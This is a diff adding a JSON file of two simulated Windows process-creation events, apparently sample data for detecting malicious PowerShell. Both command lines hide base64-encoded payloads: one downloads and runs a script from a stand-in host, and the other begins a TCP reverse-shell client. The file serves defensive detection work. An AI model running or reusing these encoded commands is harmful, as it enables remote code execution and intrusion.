@@ -1,0 +1,24 @@
+[
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-11-13T10:15:22.000Z",
+    "EventData": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "TargetUserName": "attacker_svc",
+      "NewProcessId": "4812"
+    }
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-11-13T10:16:04.000Z",
+    "EventData": {
+      "NewProcessName": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+      "CommandLine": "pwsh.exe -windowstyle hidden -noprofile -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=",
+      "ParentProcessName": "C:\\Windows\\explorer.exe",
+      "TargetUserName": "jdoe",
+      "NewProcessId": "5120"
+    }
+  }
+]
